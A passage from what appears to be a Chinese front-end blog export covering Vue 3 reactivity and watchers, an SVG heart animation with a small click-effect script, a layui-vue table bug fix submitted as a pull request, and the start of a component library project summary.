之后仍可以保持响应性。如果从组合式函数返回一个 reactive 对象会导致在对象解构过程中丢失与组合式函数内状态的响应性连接。 如何选择 如果需要一个响应式原始值，使用 ref() 是正确的选择。 如果需要一个响应式对象，层级不深，那么使用 ref 也可以。 如果需要一个响应式可变对象，并且对象层级较深，需要深度跟踪，那么使用 reactive。 可以把 reactive 看成 ref 的子集，ref 可以解决一切问题。 toRef vs toRefs toRef 基于 reactive 对象上的一个属性，创建一个对应的 ref。这样创建的 ref 与其源属性保持同步：改变源属性的值将更新 ref 的值，反之亦然。 const state = reactive({ foo: 1, bar: 2 }) const fooRef = toRef(state, 'foo') // fooRef2 不会和 state.foo 保持同步，因为这个 ref() 接收到的是一个纯数值 const fooRef2 = ref(state.foo) // 更改 fooRef 会更新源属性 fooRef.value++ fooRef2.value = 5 console.log(state.foo) // 2 // 更改源属性也会更新 fooRef state.foo++ console.log(fooRef.value) // 3 当 toRef 与组件 props 结合使用时，关于禁止对 props 做出更改的限制依然有效。尝试将新的值传递给创建的 ref 等效于尝试直接更改 props，这是不允许的。可以使用可写 的 computed 或在组件上使用 v-model 替代。 toRefs() 将一个 reactive 对象转换为一个普通对象，这个普通对象的每个属性都是指向源对象相应属性的 ref。每个单独的 ref 都是使用 toRef() 创建的。 const state = reactive({ foo: 1, bar: 2 }) const stateAsRefs = toRefs(state) // stateAsRefs 中的 ref 和源属性已经“链接上了” state.foo++ console.log(stateAsRefs.foo.value) // 2 stateAsRefs.foo.value++ console.log(state.foo) // 3 当从组合式函数中返回响应式对象时，toRefs 相当有用，消费者组件可以解构/展开返回的对象而不会失去响应性： function useFeatureX() { const state = reactive({ foo: 1, bar: 2 }) // ...基于状态的操作逻辑 // 在返回时都转为 ref return toRefs(state) } // 可以解构而不会失去响应性 const { foo, bar } = useFeatureX() 即使源属性当前不存在，toRef() 也会返回一个可用的 ref，相比之下 toRefs 就不会为可选 props 创建对应的 ref，只会为源对象上可以枚举的属性创建 ref。 computed computed() 接受一个 getter 函数，返回一个 只读（应该更新它所依赖的源状态以触发新的计算）的响应式 ref 对象，通过 .value 暴露 getter 函数的返回值。 也可以接受一个带有 get 和 set 函数的对象来创建一个 可写 的 ref 对象。 和一般的 ref 类似，可以通过 .value 访问计算结果，计算属性 ref 也会在模板中自动解包，无需添加 .value。 方法 vs computed 方法和计算属性两种方式的最终效果是完全相同的，不同的是计算属性是基于它的响应式依赖进行缓存的，只在相关响应式依赖发生改变时才会重新求值。 下面例子中只要 message 还没有发生改变，多次访问 reversedMessage 计算属性会立即返回之前的计算结果，而不必重复执行 getter 函数。 &lt;template&gt; &lt;p&gt;Original message: &quot;{{ message }}&quot;&lt;/p&gt; &lt;p&gt;Computed reversed message: &quot;{{ reversedMessage }}&quot;&lt;/p&gt; &lt;/template&gt; &lt;script setup&gt; import { ref, computed } from 'vue' const message = ref('Hello') const reversedMessage = computed(() =&gt; { return message.value.split('').reverse().join('') }) &lt;/script&gt; 所以下面的计算属性永远不会更新，因为 Date.now() 并不是一个响应式依赖： const now = computed(() =&gt; Date.now()) 相比之下，方法调用总是会在重渲染发生时再次执行函数。 为什么需要缓存呢？ 假如有一个非常耗性能的计算属性 list，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 list。没有缓存的话，我们会重复执行非常多次 list 的 getter，然而这实际上没有必要！如果确定不需要缓存，那么也可以使用方法调用。 watch watch vs computed 计算属性描述的是如何根据其他值派生一个值，因此 getter 的职责应该仅为计算和返回该值，而没有任何其他的副作用（如 异步请求或者更改 DOM）。 如果需要在状态变化时执行一些副作用：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态时，监听器提供了一个更通用的方法，当需要在数据变化时执行异步或开销较大的操作时，来响应数据的变化。 但是像上面响应性本质里面的例子一样，使用一个响应式副作用来更改一个 ref 反而不是最优解，使用计算属性会更直观简洁。 watchEffect() watchEffect() 立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行。返回值是一个用来停止该副作用的函数。 const unwatch = watchEffect(() =&gt; {}) // ...当该侦听器不再需要时 unwatch() 第一个参数就是要运行的副作用函数，它的参数也是一个函数，用来注册清理回调：会在该副作用下一次执行前被调用，可以用来清理无效的副作用，例如等待中的异步请求。 watchEffect(async (onCleanup) =&gt; { const { response, cancel } = doAsyncWork(id.value) // `cancel` 会在 `id` 更改时调用，以便取消之前未完成的请求 onCleanup(cancel) data.value = await response }) 第二个参数是一个可选的选项，可以用来调整副作用的刷新时机或调试副作用的依赖、钩子事件。 当更改了响应式状态，可能会同时触发 Vue 组件更新和侦听器回调。默认情况下，用户创建的侦听器回调，都会在 Vue 组件更新之前被调用，这意味着在侦听器回调中访问的 DOM 将是被 Vue 更新之前的状态。如果想在侦听器回调中访问被 Vue 更新之后的 DOM，可以设置 flush: 'post' 第二个参数选项。后置刷新的 watchEffect() 有个更方便的别名 watchPostEffect()： watchEffect(callback, { flush: 'post' }) watchPostEffect(() =&gt; { /* 在 Vue 更新后执行 */ }) 在某些特殊情况下（例如要使缓存失效），可能要在响应式依赖发生改变时立即触发侦听器。这可以通过设置 flush: 'sync' 来实现。该设置应谨慎使用，因为如果有多个属性同时更新，这将导致一些性能和数据一致性的问题。同步的 watchEffect() 也有个别名 watchSyncEffect()： watchEffect(callback, { flush: 'sync' }) watchSyncEffect(() =&gt; {}) watch() 侦听一个或多个响应式数据源，并在数据源变化时调用所给的回调函数。返回值是一个用来停止该副作用的函数。 第一个参数是侦听器的来源，可以是以下几种： 一个 getter 函数（返回一个值，回调只在此函数的返回值变化时才会触发） 一个 ref（包括计算属性） 一个 reactive 对象（不能直接侦听属性值，需要用一个返回该属性的 getter 函数） 由以上类型的值组成的数组 import { ref, reactive, watch } from 'vue' const x = ref(0) const y = ref(0) const obj = reactive({ count: 0 }) // 错误，因为 watch() 得到的参数是一个 number // watch(obj.count, (count) =&gt; { // console.log(`count is: ${count}`) // }) // 需要提供一个 getter 函数 watch( () =&gt; obj.count, (newCount, old) =&gt; { console.log(`count is: ${newCount}`, old) } ) // 单个 ref watch(x, (newX) =&gt; { console.log(`x is ${newX}`) }) // getter 函数 watch( () =&gt; x.value + y.value, (sum) =&gt; { console.log(`sum of x + y is: ${sum}`) }) // 多个来源组成的数组 watch([x, () =&gt; y.value, obj], ([newX, newY, newObj], [oldX, oldY, old]) =&gt; { console.log(newX, newY, newObj, oldX, oldY, old); }) 第二个参数是在发生变化时要调用的回调函数。这个回调函数接受三个参数：新值、旧值（当侦听多个来源时，为两个数组，分别对应来源数组中的新值和旧值），以及一个用于注册副作用清理的回调函数：会在副作用下一次重新执行前调用，可以用来清除无效的副作用，例如等待中的异步请求。 watch(id, async (newId, oldId, onCleanup) =&gt; { const { response, cancel } = doAsyncWork(newId) // `cancel` 会在 `id` 更改时调用，以便取消之前未完成的请求 onCleanup(cancel) data.value = await response }) 第三个可选的参数是一个对象，支持以下这些选项： immediate：在侦听器创建时立即触发回调。第一次调用时旧值是 undefined。 deep：如果源是对象，强制深度遍历，以便在深层级变更时触发回调。 flush：调整回调函数的刷新时机。 onTrack / onTrigger：调试侦听器的依赖。 直接给 watch() 传入一个响应式对象，会隐式地创建一个深层侦听器——该回调函数在所有嵌套的变更时都会被触发。 const obj = reactive({ count: 0 }) watch(obj, (newValue, oldValue) =&gt; { // 在嵌套的属性变更时触发，`newValue` 和 `oldValue` 是相等的 // 因为它们是同一个对象！ }) obj.count++ // 会触发 当使用 getter 函数作为源时，回调只在此函数的返回值变化时才会触发。如果让回调在深层级变更时也能触发，需要使用 { deep: true } 强制侦听器进入深层级模式。在深层级模式时，如果回调函数由于深层级的变更而被触发，那么新值和旧值将是同一个对象。 const obj = reactive({ count: 0 }) watch(() =&gt; obj, (newValue, oldValue) =&gt; { // 在嵌套的属性变更时触发，`newValue` 和 `oldValue` 是相等的 // 因为它们是同一个对象！ }, { deep: true }) obj.count++ // 会触发 给 watch() 传入一个对象类型 ref 时，如果需要侦听其深层属性变化，也需要使用 { deep: true }。 const obj = ref({ count: 0 }) watch(obj, (newValue, oldValue) =&gt; { // 在嵌套的属性变更时触发，`newValue` 和 `oldValue` 是相等的 // 因为它们是同一个对象！ }, { deep: true }) obj.value.count++ // 会触发 深度侦听需要遍历被侦听对象中的所有嵌套的属性，当用于大型数据结构时，开销很大。因此只在必要时才使用它，并且要留意性能。 当更改了响应式状态，可能会同时触发 Vue 组件更新和侦听器回调。默认情况下，用户创建的侦听器回调，都会在 Vue 组件更新之前被调用，这意味着在侦听器回调中访问的 DOM 将是被 Vue 更新之前的状态。如果想在侦听器回调中访问被 Vue 更新之后的 DOM，可以设置 flush: 'post' 第三个参数选项。 watch(source, () =&gt; { /* 在 Vue 更新后执行 */ }, { flush: 'post' }) watch vs watchEffect watch 和 watchEffect 都能响应式地执行有副作用的回调。它们之间的主要区别是追踪响应式依赖的方式： watch 默认是懒执行的：仅当数据源变化时，才会执行回调。watchEffect 会立即执行一次副作用函数。 watch 可以访问所侦听状态的前一个值和当前值。 watch 只追踪明确侦听的数据源，不会追踪任何在回调中访问到的东西，更加明确是应该由哪个状态触发侦听器重新执行。watch 会避免在发生副作用时追踪依赖，因此，我们能更加精确地控制回调函数的触发时机。 watchEffect，则会在副作用发生期间追踪依赖。它会在同步执行过程中，自动追踪所有能访问到的响应式属性。这更方便，而且代码往往更简洁，但有时其响应性依赖关系会不那么明确。 在某些场景中，我们希望在创建 watch 侦听器时，立即执行一遍回调。例如我们请求一些初始数据后，在相关状态更改时重新请求数据。可以通过传入 immediate: true 选项来强制侦听器的回调立即执行： const obj = reactive({ count: 0 }) watch( () =&gt; obj.count, (newCount, old) =&gt; { console.log(`count is: ${newCount}`, old) }, { immediate: true } // 立即执行，且当 `source` 改变时再次执行 ) // 相当于 watchEffect( (onCleanup) =&gt; { console.log(`count is: ${obj.count}`) } ) 侦听器的回调使用与源完全相同的响应式状态时，使用 watchEffect() 会更简单。例如下面的代码，在每当 todoId 的引用发生变化时使用侦听器来加载一个远程资源： const todoId = ref(1) const data = ref(null) watch(todoId, async () =&gt; { const response = await fetch( `https://jsonplaceholder.typicode.com/todos/${todoId.value}` ) data.value = await response.json() }, { immediate: true }) 这里注意侦听器是两次使用了 todoId，一次是作为源，一次是在回调中。watchEffect() 允许我们自动跟踪回调的响应式依赖，所以上面的侦听器可以重写为： watchEffect(async () =&gt; { const response = await fetch( `https://jsonplaceholder.typicode.com/todos/${todoId.value}` ) data.value = await response.json() }) 这个例子中，回调会立即执行，不需要指定 immediate: true。在执行期间，它会自动追踪 todoId.value 作为依赖（和计算属性类似）。每当 todoId.value 变化时，回调会再次执行。有了 watchEffect()，我们不再需要明确传递 todoId 作为源值。 watchEffect 仅会在其同步执行期间，才追踪依赖。在使用异步回调时，只有在第一个 await 正常工作前访问到的属性才会被追踪。 对于上面例子中只有一个依赖项的例子来说，watchEffect() 的好处相对较小。但是对于有多个依赖项的侦听器来说，使用 watchEffect() 可以消除手动维护依赖列表的负担。此外，如果你需要侦听一个嵌套数据结构中的几个属性，watchEffect() 可能会比深度侦听器更有效，因为它将只跟踪回调中被使用到的属性，而不是递归地跟踪所有的属性。 异步和停止侦听器 在 setup() 或 &lt;script setup&gt; 中用同步语句创建的侦听器，会自动绑定到宿主组件实例上，并且会在宿主组件卸载时自动停止。因此，在大多数情况下，无需关心怎么停止一个侦听器。 如果用异步回调创建一个侦听器，那么它不会绑定到当前组件上，你必须手动停止它，以防内存泄漏。要手动停止一个侦听器，调用 watch 或 watchEffect 返回的函数： // 会自动停止 watchEffect(() =&gt; {}) // 不会自动停止！ setTimeout(() =&gt; { watchEffect(() =&gt; {}) }, 100) const unwatch = watchEffect(() =&gt; {}) // ...当该侦听器不再需要时 unwatch() 需要异步创建侦听器的情况很少，尽可能选择同步创建。如果需要等待一些异步数据，可以使用条件侦听逻辑： // 需要异步请求得到的数据 const data = ref(null) watchEffect(() =&gt; { // 请求数据... if (data.value) { // 数据加载后执行某些操作 } }) ","link":"https://zkrisj.github.io/post/vue-zhong-de-xiang-ying-xing/"},{"title":"SVG 心形波纹动画 + Click Love","content":"介绍 代码的世界可以很简单也可以很浪漫，又到了一年一度秀浪漫的日子（过去几天了），给大家介绍一个 SVG 心形波纹动画和 Click Love 页面点击特效，效果如下： SVG 心形波纹动画 定义一个 svg 元素。 &lt;svg id=&quot;hearts&quot; viewBox=&quot;-600 -400 1200 800&quot; preserveAspectRatio=&quot;xMidYMid slice&quot;&gt; &lt;symbol id=&quot;heart&quot; viewBox=&quot;-69 -16 138 138&quot;&gt; &lt;path d=&quot;M0,12 C 50,-30 110,50 0,120 C-110,50 -50,-30 0,12z&quot; /&gt; &lt;/symbol&gt; &lt;/svg&gt; viewBox 属性的值是一个包含四个数字的列表：x、y、width 和 height。x 和 y 表示视口的左上角坐标，width 和 height 代表它的尺寸。这些数字由空格或逗号分隔，指定了用户空间中的一个矩形，指定了 svg 元素的视口边界（而非浏览器视口）。 preserveAspectRatio 属性指示具有提供给定纵横比的 viewBox 的元素必须如何适应具有不同纵横比的视口。因为 SVG 图像的纵横比是由 viewBox 属性定义的，所以如果未设置该属性，则 preserveAspectRatio 属性无效（有一个例外，对于 &lt;image&gt; 元素，preserveAspectRatio 定义引用图像应如何适合 &lt;image&gt; 元素定义的矩形）。 xMidYMid（默认值）- 表示强制统一缩放。将元素的 viewBox 的中点 x 值与视口的中点 x 值对齐；将元素的 viewBox 的中点 y 值与视口的中点 y 值对齐。 第二个参数是可选的：meet（默认）表示缩放图形，整个 viewBox 在视口中可见；slice 表示缩放图形，但 viewBox 绘制的区域大于视口。 使用 symbol 元素定义了一个图形模板对象，下面可以使用 use 元素复用这个模板。 定义颜色数组、心形数组。 const colors = [&quot;#e03776&quot;, &quot;#8f3e98&quot;, &quot;#4687bf&quot;, &quot;#3bab6f&quot;, &quot;#f9c25e&quot;, &quot;#f47274&quot;]; const hearts = []; 向心形数组添加 symbol 元素的 use 元素实例。 function useTheHeart(n) { const use = document.createElementNS('http://www.w3.org/2000/svg', 'use'); use.n = n; use.setAttribute('href', '#heart'); use.setAttribute('transform', `scale(${use.n})`); use.setAttribute('fill', colors[n % colors.length]); use.setAttribute('x', -69); use.setAttribute('y', -69); use.setAttribute('width', 138); use.setAttribute('height', 138); hearts.push(use); svg.appendChild(use); } for (let n = 18; n &gt;= 0; n--) useTheHeart(n); use 元素实例的 x、y、width 和 height 属性需要和 symbol 元素的 viewBox 坐标系相对应。 根据 use 元素的序号对其进行放大指定倍数，同时将放大倍数绑定到元素上。 定义动画函数。 function Frame() { window.requestAnimationFrame(Frame); for (let i = 0; i &lt; hearts.length; i++) { if (hearts[i].n &lt; 18) { hearts[i].n += .01; } else { hearts[i].n = 0; svg.appendChild(hearts[i]); } hearts[i].setAttribute('transform', `scale(${hearts[i].n})`); } } Frame(); 循环遍历 hearts 数组，将每个心形放大倍数 += .01。 当心形的放大倍数大于 18 时，将其调整为 0，并将元素从 svg 子节点中删除并重新添加到子节点列表的末尾处（如果某个节点已经拥有父节点，在被传入 appendChild 方法参数中调用后，它首先会被移除，再被插入到新的位置）。 Click Love 页面点击特效 这是一个迷你的页面小插件，体积只有 1KB 多，通过 script 标签引入后，点击页面任意处会出现小爱心的图形。源码如下： !function(e,t,a){function r(){for(var e=0;e&lt;n.length;e++)n[e].alpha&lt;=0?(t.body.removeChild(n[e].el),n.splice(e,1)):(n[e].y--,n[e].scale+=.004,n[e].alpha-=.013,n[e].el.style.cssText=&quot;left:&quot;+n[e].x+&quot;px;top:&quot;+n[e].y+&quot;px;opacity:&quot;+n[e].alpha+&quot;;transform:scale(&quot;+n[e].scale+&quot;,&quot;+n[e].scale+&quot;) rotate(45deg);background:&quot;+n[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)}var n=[];e.requestAnimationFrame=e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)},function(e){var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)}(&quot;.heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}&quot;),function(){var a=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e){a&amp;&amp;a(),function(e){var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,n.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;}),t.body.appendChild(a)}(e)}}(),r()}(window,document); 将以上代码保存为一个 JS 文件，通过 script 标签引入到页面即可开启动效。 码上掘金 ","link":"https://zkrisj.github.io/post/svg-xin-xing-bo-wen-dong-hua-click-love/"},{"title":"如何给开源项目提 PR，给 layui - vue 提了个 PR，已合并","content":"Pull Request 介绍 贡献者请项目维护者“拉取”修改的软件内容（因此称为拉取请求），若此修改内容应该成为正式代码库的一部分，就需要合并拉取请求中提到的软件内容。 最常用的方式是“Fork + Pull”模式：如果要为拉取请求创建新分支，又没有仓库的写入权限，可以先对仓库 Fork，仓库参与者不必向仓库创建者申请提交权限，而是在自己的托管空间下建立仓库的派生（Fork）。 拉取请求只能在不同的两个分支之间打开，可以在创建拉取请求时指定要将更改合并到哪个分支。 创建拉取请求 Fork 创建存储库分支。 进行修复。 创建拉取请求。 在存储库的主页“Branch（分支）”菜单中，选择包含提交的分支。 在文件列表上方，单击 “拉取请求”。 使用基础分支下拉菜单选择要向其合并更改的分支，然后使用比较分支下拉菜单选择进行了更改的主题分支。 为你的拉取请求输标题和说明。 要创建可供审查的拉取请求，请单击“创建拉取请求”。若要创建草稿拉取请求，请使用下拉列表并选择“创建草稿拉取请求”，然后单击“草稿拉取请求”。 创建拉取请求后，你可以请求特定人员审查你提议的更改。如果你是组织成员，还可以请求特定团队审查你的更改。 在存储库名称下，单击 “拉取请求”。 在拉取请求列表中，单击你想要请求特定人员或团队审查的拉取请求。 导航到右侧边栏中的“审查者”。 若要向建议的人员请求审查，请在“审查者”下其用户名旁，单击“请求” 。 （可选）若要向建议人员以外的其他人请求审查，请单击“审查者”，然后单击下拉菜单中的姓名。 更改后，可以请求审查者重新审查你的拉取请求。导航到右侧边栏中的“审查者”，然后单击你想要其审查的审查者姓名旁边的 。 被请求的审查者或团队将收到你请求他们审查拉取请求的通知。如果你请求团队审查，并启用了代码评审分配，则会向特定成员发出请求，并且取消团队作为审查者。 审查拉取请求后，对仓库具有推送权限的任何人都可以完成合并。 合并拉取请求 在存储库名称下，单击 “Pull requests”。 在“Pull Requests（拉取请求）”列表中，单击要合并的拉取请求。 根据对仓库启用的合并选项，你可以： 单击“合并拉取请求”，将所有提交合并到基分支中。 如果未显示“合并拉取请求”选项，则单击合并下拉菜单，然后选择“创建合并提交” 。 单击合并下拉菜单，选择“压缩并合并”，然后单击“压缩并合并”按钮，将多个提交压缩为一个提交。 单击合并下拉菜单，选择“变基并合并”，然后单击“变基并合并”按钮，将多个提交变基为一个基分支。 如有提示，输入提交消息，或接受默认消息。 单击“确认合并”、“确认压缩并合并”，或“确认变基并合并” 。 （可选）删除分支。这有助于仓库的分支列表保持整洁。 给 layui- vue 提了个 PR，已合并 青训营中我们团队做的是组件库项目。因为我负责的是 Pagination 和 Table 组件，但 Ant Design Vue 和 Element Plus 的表格组件都太复杂了，所以我参考的是较简单的 layui - vue。 Bug 由于开发测试完组件后，也需要写对应的组件演示文档。在写文档过程中，发现了 Table 组件演示文档中的一个 Bug： 可以看到，行内编辑图标首次点击无效，只能从上到下开启编辑、从下到上关闭编辑，点击其他行图标也只从首行开始编辑。出问题的代码： &lt;template&gt; &lt;lay-table :columns=&quot;columns28&quot; :data-source=&quot;dataSource28&quot;&gt; &lt;template #username=&quot;{ data }&quot;&gt; &lt;lay-input v-if=&quot;edingKeys[data.id]&quot; :model-value=&quot;data.username&quot; @input=&quot;changeUsername($event, data)&quot;&gt; &lt;template #suffix&gt; &lt;lay-icon type=&quot;layui-icon-close&quot; style=&quot;right:10px;&quot; v-if=&quot;edingKeys[data.id]&quot; @click=&quot;deleteEdit(data.id)&quot;&gt;&lt;/lay-icon&gt; &lt;/template&gt; &lt;/lay-input&gt; &lt;span v-else&gt; {{ data.username }} &lt;lay-icon type=&quot;layui-icon-edit&quot; style=&quot;position: absolute;right: 10px;&quot; v-if=&quot;!edingKeys[data.id]&quot; @click=&quot;editHandle(data.id)&quot;&gt;&lt;/lay-icon&gt; &lt;/span&gt; &lt;/template&gt; &lt;/lay-table&gt; &lt;/template&gt; &lt;script&gt; import { ref } from 'vue' export default { setup() { const edingKeys = ref([]) const columns28 = [ { title:&quot;账户&quot;, width:&quot;200px&quot;, key:&quot;username&quot;, customSlot: &quot;username&quot; },{ title:&quot;密码&quot;, width: &quot;300px&quot;, key:&quot;password&quot; },{ title:&quot;性别&quot;, key:&quot;sex&quot; },{ title:&quot;年龄&quot;, width: &quot;300px&quot;, key:&quot;age&quot; },{ title:&quot;备注&quot;, width: &quot;180px&quot;, key:&quot;remark&quot;, ellipsisTooltip: true } ] const dataSource28 = ref([ {id:&quot;1&quot;,username:&quot;root&quot;, password:&quot;root&quot;,sex:&quot;男&quot;, age:&quot;18&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;2&quot;,username:&quot;root&quot;, password:&quot;root&quot;,sex:&quot;男&quot;, age:&quot;18&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;3&quot;,username:&quot;woow&quot;, password:&quot;woow&quot;,sex:&quot;男&quot;, age:&quot;20&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;4&quot;,username:&quot;woow&quot;, password:&quot;woow&quot;,sex:&quot;男&quot;, age:&quot;20&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;5&quot;,username:&quot;woow&quot;, password:&quot;woow&quot;,sex:&quot;男&quot;, age:&quot;20&quot;, remark: 'layui - vue（谐音：类 UI) '} ]) const editHandle = (key) =&gt; { edingKeys.value.push(key); } const deleteEdit = (key) =&gt; { edingKeys.value.splice(edingKeys.value.indexOf(key),1); } const changeUsername = (val, data) =&gt; { dataSource28.value.forEach(element =&gt; { if(element.id == data.id) { element.username = val; } }); } return { edingKeys, deleteEdit, columns28, editHandle, dataSource28, changeUsername, } } } &lt;/script&gt; 上面代码在 lay-input、lay-icon type=&quot;layui-icon-close&quot;、lay-icon type=&quot;layui-icon-edit&quot; 这三个组件上使用 v-if 表达式来条件性地渲染元素时，条件分别为 edingKeys[data.id]、edingKeys[data.id] 和 !edingKeys[data.id]。响应式变量 edingKeys 初始化时是一个空数组，在点击行编辑图标时，由绑定的 editHandle 方法将当前行的 id 字段添加到数组中，然后由响应式对象 edingKeys 根据行的 id 字段动态改变上述三个条件表达式的值，从而动态渲染行的编辑状态。 问题出在：id 字段是数字类型字符串，而 在 JavaScript 中，可以同时使用字符串 arr[&quot;1&quot;] 或数字 arr[1] 访问对象属性和数组元素。 例如，当点击第三行的编辑图标时，editHandle 方法会将 &quot;3&quot; 添加到数组中，此时 edingKeys 的值为 [&quot;3&quot;]，数组中只有一个元素，所以只有 edingKeys[0] 的条件为真，而 edingKeys[1]、edingKeys[2] 以后的值都为 undefined，条件都为假，所以第一次点击任何行时都不会有反应。然后我们点击第四行的编辑图标，此时 editHandle 方法会将 &quot;4&quot; 添加到数组中，此时 edingKeys 的值为 [&quot;3&quot;, &quot;4&quot;]，只有 edingKeys[0]、edingKeys[1] 的条件为真，而 edingKeys[2]、edingKeys[3] 以后的值都为 undefined，条件都为假。所以第一行变成了编辑状态，而不是第三行或第四行。 以此类推，继续点击将依次从从上到下开启编辑状态。当点击任意某个已经开启编辑状态的行上的关闭图标时，deleteEdit 方法会将当前行的 id 字段从 edingKeys 数组中删除，edingKeys 数组的长度将减一。所以会从 edingKeys 数组的长度减一索引处，即从 edingKeys[edingKeys.length-1] 开始取消编辑。继续点击任意关闭图标，将依次从下到上关闭行编辑状态。 解决方法 很简单，只需要把三个 v-if 表达式的条件 edingKeys[data.id]、edingKeys[data.id] 和 !edingKeys[data.id] 改为 edingKeys.includes(data.id)、edingKeys.includes(data.id) 和 !edingKeys.includes(data.id)，includes() 方法用来判断一个数组是否包含一个指定的值。 但更完善的方法是在 editHandle 方法中将整个行数据而不是行的 id 字段添加到数组中，然后使用 edingKeys.includes(data)、edingKeys.includes(data) 和 !edingKeys.includes(data) 来判断编辑状态。因为行的 id 字段如果不是唯一的，即多行的 id 字段值相同，会出现点击一行的编辑和关闭图标，将同时开启和关闭多行的编辑状态。每行的行数据却是唯一的。 &lt;template&gt; &lt;lay-table :columns=&quot;columns28&quot; :data-source=&quot;dataSource28&quot;&gt; &lt;template #username=&quot;{ data }&quot;&gt; &lt;lay-input v-if=&quot;edingKeys.includes(data)&quot; :model-value=&quot;data.username&quot; @input=&quot;changeUsername($event, data)&quot;&gt; &lt;template #suffix&gt; &lt;lay-icon type=&quot;layui-icon-close&quot; style=&quot;right:10px;&quot; v-if=&quot;edingKeys.includes(data)&quot; @click=&quot;deleteEdit(data)&quot;&gt;&lt;/lay-icon&gt; &lt;/template&gt; &lt;/lay-input&gt; &lt;span v-else&gt; {{ data.username }} &lt;lay-icon type=&quot;layui-icon-edit&quot; style=&quot;position: absolute;right: 10px;&quot; v-if=&quot;!edingKeys.includes(data)&quot; @click=&quot;editHandle(data)&quot;&gt;&lt;/lay-icon&gt; &lt;/span&gt; &lt;/template&gt; &lt;/lay-table&gt; &lt;/template&gt; &lt;script&gt; import { ref } from 'vue' export default { setup() { const edingKeys = ref([]) const columns28 = [ { title:&quot;账户&quot;, width:&quot;200px&quot;, key:&quot;username&quot;, customSlot: &quot;username&quot; },{ title:&quot;密码&quot;, width: &quot;300px&quot;, key:&quot;password&quot; },{ title:&quot;性别&quot;, key:&quot;sex&quot; },{ title:&quot;年龄&quot;, width: &quot;300px&quot;, key:&quot;age&quot; },{ title:&quot;备注&quot;, width: &quot;180px&quot;, key:&quot;remark&quot;, ellipsisTooltip: true } ] const dataSource28 = ref([ {id:&quot;1&quot;,username:&quot;root&quot;, password:&quot;root&quot;,sex:&quot;男&quot;, age:&quot;18&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;2&quot;,username:&quot;root&quot;, password:&quot;root&quot;,sex:&quot;男&quot;, age:&quot;18&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;3&quot;,username:&quot;woow&quot;, password:&quot;woow&quot;,sex:&quot;男&quot;, age:&quot;20&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;4&quot;,username:&quot;woow&quot;, password:&quot;woow&quot;,sex:&quot;男&quot;, age:&quot;20&quot;, remark: 'layui - vue（谐音：类 UI) '}, {id:&quot;5&quot;,username:&quot;woow&quot;, password:&quot;woow&quot;,sex:&quot;男&quot;, age:&quot;20&quot;, remark: 'layui - vue（谐音：类 UI) '} ]) const editHandle = (data) =&gt; { edingKeys.value.push(data); } const deleteEdit = (data) =&gt; { edingKeys.value.splice(edingKeys.value.indexOf(data),1); } const changeUsername = (val, data) =&gt; { dataSource28.value.forEach(element =&gt; { if(element.id == data.id) { element.username = val; } }); } return { edingKeys, deleteEdit, columns28, editHandle, dataSource28, changeUsername, } } } &lt;/script&gt; 修复后的效果： 提了 PR 由于 layui 仓库在 gitee，GitHub 上面的仓库已经撤下了，所以在 gitee 上面提的 PR，gitee PR 操作比 GitHub 更加方便和简单，在 Fork 项目的主页点击 + Pull Request 按钮，然后选择分支，输入标题和说明即可。 目前 已合并。 ","link":"https://zkrisj.github.io/post/gei-layui-vue-ti-liao-ge-pr/"},{"title":"青训营大项目总结 ｜ 青训营笔记","content":"介绍 青训营大项目： 基于 NextJS 开发仿掘金站点 组件库 关于新冠疫情的数据可视化作品 我们团队做的是组件库项目。 项目需求 虽然业界已经有非常多知名组件库(antd/iview/material design 等)，但实际工作中各团队通常也会应设计规范要求，自行开发属于团队内部的基础/业务组件库，对于高阶前端，开发一个属于自己的组件库已经是一种普遍但重要的基本技能。 实际开发中有许多需要考虑的细节： 使用何种语言开发组件库？ ts/es6 + babel + flow less/sass/stylus/postcss/atomic-css Sass/Less Atomic CSS css-in-js 完全支持样式覆盖 ✅ ✅ ❗(需要使用className支持) 支持rem布局 ✅ ✅ ❗(大部分库支持) 可读性 强 稍弱 强 上手成本 低 中 高 是否支持SSR 天然支持 天然支持 需要额外支持 是否支持流式渲染 天然支持 天然支持 需要额外支持 支持postcss ✅ ✅ ❗(有自己的plugin生态) 如何保证组件库质量（工程化）？ 单测、e2e 测试 组件库的质量保障从流程上来说，主要是 code review 和严格的 UI 验收、QA 测试等流程。从技术层面来说可以收敛发包权限，以及在 CI/CD 中实现自动发包，杜绝研发过程中在非 master 分支上随意发包的危险操作。还有单元测试、快照测试、e2e 测试等常用的技术手段。 尽可能接入测试工具，包括： jest、chai、enzyme、karma @testing-library/react benchmark lint、lint-staged、prettier、style-lint 等。 制定规范的目的在于保证质量、方便业务方使用和增加组件库的可扩展性。比如上文提到的对于样式的封装、常用 mixin 封装，强制使用颜色变量等。还有设计统一的组件库 API 风格规范，能降低业务方的使用成本。 拆解来看： 代码提交： husky commitlint lint-staged 代码风格： eslint + prettier stylelint commit-lint 文档风格： remark-lint 